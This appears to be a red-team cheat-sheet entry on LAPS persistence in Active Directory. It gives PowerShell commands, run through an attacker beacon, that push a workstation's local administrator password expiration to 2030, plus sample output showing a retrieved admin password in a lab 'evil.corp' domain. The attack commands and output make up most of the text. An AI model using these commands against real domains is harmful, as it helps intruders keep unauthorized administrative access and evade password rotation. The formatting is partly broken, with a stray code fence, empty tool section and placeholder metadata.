# Local Administrator Password Solution (LAPS) Persistence

## Increase expiration date (persistence)
⚠️The password will still reset in case of:
- `Reset-AdmPwdPassword` cmdlet
- `Do not allow password expiration time longer than required by policy` is enabled in the LAPS GPO.

Requirements:
* Expiration time = epoch value
* SYSTEM permission

>powershell Get-DomainObject -Identity wkstn2 -Properties ms-mcs-admpwdexpirationtime

>powershell Set-DomainObject -Identity wkstn2 -Set @{"ms-mcs-admpwdexpirationtime"="1913564304000"}
```

```beacon
beacon> powershell Get-AdmPwdPassword -ComputerName wkstn2 | fl

ComputerName        : WKSTN2
DistinguishedName   : CN=WKSTN2,OU=Workstations,DC=edu,DC=evil,DC=corp
Password            : awdc1948wa4dc1
ExpirationTimestamp : 8/21/2030 5:38:24 PM
```


## Tools
########
########


```meta
ttp: T1000
requirements:
results: 
description: 
```